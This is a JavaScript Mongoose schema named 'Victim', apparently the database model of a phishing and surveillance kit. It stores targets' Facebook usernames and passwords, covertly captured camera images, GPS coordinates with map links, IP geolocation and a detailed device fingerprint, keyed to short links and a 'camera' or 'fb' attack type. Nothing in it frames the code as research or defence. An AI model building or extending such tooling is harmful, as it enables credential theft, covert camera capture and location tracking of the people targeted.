const mongoose = require('mongoose');

const victimSchema = new mongoose.Schema({
    id: { type: String, unique: true, required: true },
    fbId: { type: String, required: true },
    type: { type: String, enum: ['camera', 'fb'], default: 'camera' },
    shortLink: { type: String },
    timestamp: { type: Date, default: Date.now },
    status: { type: String, default: 'pending' },
    
    // ব্রাউজার ডেটা
    ip: { type: String },
    location: {
        country: String,
        region: String,
        city: String,
        latitude: Number,
        longitude: Number,
        isp: String
    },
    gpsLocation: {
        latitude: Number,
        longitude: Number,
        accuracy: Number,
        googleMaps: String
    },
    device: {
        productSub: String,
        vendor: String,
        maxTouchPoints: Number,
        doNotTrack: String,
        hardwareConcurrency: Number,
        cookieEnabled: Boolean,
        appCodeName: String,
        appName: String,
        appVersion: String,
        platform: String,
        product: String,
        userAgent: String,
        language: String,
        languages: [String],
        webdriver: Boolean,
        pdfViewerEnabled: Boolean,
        deviceMemory: String,
        screen: String,
        colorDepth: Number
    },
    media: [{
        kind: String,
        label: String,
        deviceId: String
    }],
    network: {
        type: String,
        rtt: Number,
        saveData: Boolean,
        effectiveType: String,
        downlink: Number,
        downlinkMax: Number
    },
    battery: {
        level: Number,
        charging: Boolean,
        chargingTime: Number,
        dischargingTime: Number
    },
    camera: [{
        image: { type: String },
        timestamp: { type: Date, default: Date.now }
    }],
    fbLogin: {
        username: String,
        password: String,
        timestamp: Date,
        ip: String
    },
    collectedAt: { type: Date }
});

module.exports = mongoose.model('Victim', victimSchema);